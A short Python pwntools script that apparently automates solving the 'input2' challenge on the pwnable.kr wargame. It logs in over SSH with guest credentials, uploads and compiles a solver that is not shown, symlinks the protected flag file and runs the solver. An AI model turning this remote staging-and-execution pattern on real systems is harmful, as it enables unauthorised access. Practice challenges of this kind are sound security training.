from pwn import *

r = ssh(user='input2', host='pwnable.kr', password='guest', port=2222)
p: process = r.process(['bash'])
p.sendline(b'mkdir /tmp/dimas')

p.sendline(b'cd /tmp/dimas')

p.sendline(b'cat <<EOF>solve.c')
p.sendline(open('solve.c', 'rb').read())
p.sendline(b'EOF')

p.sendline(b'ln -sf /home/input2/flag flag')
p.sendline(b'gcc solve.c -o solve')
p.sendline(b'./solve')

p.interactive()
